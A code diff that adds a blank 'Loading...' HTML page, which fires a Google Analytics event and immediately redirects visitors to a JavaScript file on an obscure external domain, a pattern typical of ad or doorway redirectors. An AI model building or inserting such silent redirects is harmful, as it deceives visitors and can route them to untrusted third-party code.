@@ -1,0 +1,38 @@
+
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G03NHX4D9G"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-G03NHX4D9G');
+</script>
+</head>
+
+<body>
+  <script>
+    const destinations = [
+      "https://braceslinear.com/b8/1f/13/b81f134cc26510fc67813f6dca90178f.js"
+    ];
+
+    const destination = destinations[Math.floor(Math.random() * destinations.length)];
+
+    gtag('event', 'redirect_click', {
+      destination: destination,
+      timestamp: new Date().toISOString()
+    });
+
+    setTimeout(() => {
+      window.location.href = destination;
+    }, 0);
+  </script>
+</body>
+</html>
